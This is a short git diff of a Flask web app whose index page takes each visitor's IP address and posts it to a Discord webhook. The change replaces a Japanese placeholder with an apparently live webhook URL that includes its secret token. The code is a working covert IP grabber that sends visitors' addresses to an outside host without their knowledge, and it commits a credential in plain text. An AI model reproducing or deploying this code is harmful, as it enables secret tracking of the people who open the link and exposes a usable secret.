@@ -7,7 +7,7 @@ app = Flask(__name__)
 @app.route('/')
 def index():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    url = "あなたのDiscordのWebhook URL"
+    url = "https://discord.com/api/webhooks/1539226239792054362/Ydzpz_IlRmffJQ7sc5e9shC5zHTKqFgRue-O2scW1zXJSg6TjdgzBBVKENe8XW-ZbQZT"
     data = {"content": f"IPアドレス: {ip}"}
     req = urllib.request.Request(
         url,
@@ -22,3 +22,4 @@ def index():
 
 if __name__ == '__main__':
     app.run()
+
